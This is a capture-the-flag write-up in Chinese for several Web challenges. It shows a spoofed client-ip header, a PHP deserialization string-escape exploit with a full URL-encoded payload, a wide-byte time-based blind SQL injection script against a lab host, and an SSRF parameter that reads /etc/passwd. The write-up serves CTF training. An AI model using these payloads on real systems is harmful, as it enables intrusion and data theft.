蓝桥杯CTF的官方训练系统

# Web

## 禁止访问

通过 BurpSuite 的 Repeater 添加 Header 头 `client-ip: 192.168.1.1` 后即可获取 flag

## ezphp

打开网页，显示一张图片，源码提示header（?），随后burp抓包在返回包看到`Admin_page: admin3ecr3t.php`，于是访问路径

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
class A{
    public $key;
    public function readflag(){
        if($this->key === "\0key\0"){
            readfile('/flag');
        }
    }
}
class B{
    public function  __toString(){
        return ($this->b)();
    }
}
class C{
    public $s;
    public $str;
    public function  __construct($s){
        $this->s = $s;
    }
    public function  __destruct(){
        echo $this->str;
    }
}

$ser = serialize(new C($_GET['c']));
$data = str_ireplace("\0","00",$ser);
unserialize($data);
?>
```

### 序列化构造

- 看到有unserialize()函数，找找看有无`__wakeup()`和 `__destruct()` 方法，本题中找到了 `__destruct()` 

- __construct()创建对象触发

  __toString()类当作字符串传入触发

  __destruct()对象销毁触发

  str_ireplace()正则匹配函数，**大小写不敏感**

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
class A{
    public $key;

    //Add
    public function __construct() {
        $this->key = "\0key\0";
    }

    public function readflag(){
        if($this->key === "\0key\0"){
            readfile('/flag');
        }
    }
}
class B{
    public $b;

    //Add
    public function __construct() {
        $this->b = [new A(), "readflag"]; //存储实例和字符串
    }

    //Add
    public function  __toString() {
        ($this->b)(); //调用$this->b存储的方法
        return "";
    }
}
class C{
    public $s;
    public $str;
    public function  __construct($s){
        $this->s = '';
        $this->str = new B();
    }
    public function  __destruct(){
        echo $this->str;
    }
}

$ser = serialize(new C($_GET['c'])); // 获得类C的序列化模板串
echo $ser;
?>

// 输出
O:1:"C":2:{s:1:"s";s:0:"";s:3:"str";O:1:"B":1:{s:1:"b";a:2:{i:0;O:1:"A":1:{s:3:"key";s:5:" key ";}i:1;s:8:"readflag";}}}
```

### 字符逃逸

- PHP字符串
  - 双引号包裹：转义`\0`或者`\00`，表示空字符占位
  - 单引号包裹：`\0`不会被正确转义
- GET请求参数`c`，实例化对象时调用__construct($s)方法，传入变量`$s`即为`c`内容，构造函数中`$this->s = $s;`，赋值给全局变量`$s`

**嵌入payload后的序列化拼接串**

O:1:"C":2:{s:1:"s";s:98:"`";s:3:"str";O:1:"B":1:{s:1:"b";a:2:{i:0;O:1:"A":1:{s:3:"key";S:5:"\ key\ ";}i:1;s:8:"readflag";}}}`";s:3:"str";O:1:"B":1:{s:1:"b";a:2:{i:0;O:1:"A":1:{s:3:"key";s:5:" key ";}i:1;s:8:"readflag";}}}



序列化串中 **`s` 不能识别十六进制字符`0x00`**，因此需要将 `s` 改为 `S` 

此时**变量s长度为98**，所以需要98个0，匹配替换后长度**扩展为196**，将后面闭合部分字符**填满**，实现逃逸



**扩展后的序列化拼接串**

O:1:"C":2:{s:1:"s";s:196:"`00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";s:3:"str";O:1:"B":1:{s:1:"b";a:2:{i:0;O:1:"A":1:{s:3:"key";S:5:"\ key\ ";}i:1;s:8:"readflag";}}}`";s:3:"str";O:1:"B":1:{s:1:"b";a:2:{i:0;O:1:"A":1:{s:3:"key";s:5:" key ";}i:1;s:8:"readflag";}}}



**POC**

- 题中WAF过滤`str_ireplace("\0","00",$ser);`会将`\0` 变成 `00`，所以替换输出的序列化串中`\ key\  `为`\%00key\%00 `，实现等价绕过

  ```php
  <?php
  function filter($a) {
      $a = str_ireplace("\0","00",$a);
      // 与$a = str_ireplace('\0'.'00',$a);不同，单引号是纯文本替换，双引号是替换对应的转移后内容
      return $a;
  }
  
  $a1 = "\0";
  $a2 = "\00";
  
  var_dump(filter($a1));
  var_dump(filter($a2));
  var_dump(filter($a1) == filter($a2));
  ?>
  
  // URL编码中%00等价于PHP中转义字符\0，即�
  // \%00以URL编码%5C%00传参后解析为\�，经过过滤，\�变为\00，成为新的序列化串中s的内容部分，\00反序列化中经过PHP重新解析为�，即与\0等价，成功实现绕过
  string(2) "00"
  string(2) "00"
  bool(true)
  ```

```php
0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";s:3:"str";O:1:"B":1:{s:1:"b";a:2:{i:0;O:1:"A":1:{s:3:"key";S:5:"\%00key\%00";}i:1;s:8:"readflag";}}}
```

urlEncode + 00-->%00截断(**%00被解码为0x00**)

`str_repeat("%00", 96).******`生成96个%00

```php
%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%22%3Bs%3A3%3A%22str%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A1%3A%22b%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A3%3A%22key%22%3BS%3A5%3A%22%5C%00key%5C%00%22%3B%7Di%3A1%3Bs%3A8%3A%22readflag%22%3B%7D%7D%7D
```

## 内部员工系统

- 输入username直接提交看回显，admin显示`pass error`，其他乱输的账号显示`pass right`，说明存在admin用户;对于不存在的用户，输入错误密码则回显`pass error`

  ```php
  不输入密码直接提交时，对于不存在的用户xsssds，password为空，则pass=''为true
  select * from xxx where name ='xsssds' and pass = ''
  ```

- admin' / admin"提交，回显`input right pass to admin`，说明不存在单引号 / 双引号闭合

**但是本题不是这么做的，考虑宽字节注入**

查看源码，页面设置的**GBK编码**

```html
<head>
    <meta charset="GBK">
```

再通过测试发现能够使用**宽字节注入**，利用**延时注入**搭配16进制**绕过引号的限制**，爆破获得密码`T3y_T0_Adm1n_S3Rf`

**payload**

```python
import requests
import binascii # 转换二进制数据和 ASCII 字符串

url = 'http://eci-2zefpkb9jv5wowlgklhi.cloudeci1.ichunqiu.com:80'
c = '_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

f = ''

for x in range(50):
    for s in c:
        try:
            print(f'第{x}轮字符{s}')
            # regexp binary 转为二进制数据进行正则
            # [2:]去掉前缀0x
            # .rjust(2, '0')十六进制数值右对齐，总宽度为 2，并在左侧用 0进行填充————保证每个十六进制数值都是两位数
            sql = f"%df\" || pass regexp binary 0x5e{f + hex(ord(s))[2:].rjust(2, '0')} || sleep(3)#"
            print(sql)
            data = f'name={sql}&pass=a'
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            requests.post(url, data=data, timeout=2, headers=headers)
            f += hex(ord(s))[2:].rjust(2, '0')
            print(f)
            print(binascii.a2b_hex(f))  # 十六进制表示的字符串转换为其对应的二进制数据流
            break
        except:
            pass
```

往下就是SSRF漏洞利用，查阅得知CURLOPT_URL = 10002; 

**POST传参**

- `curl_opt[10002]=file:///etc/passwd`

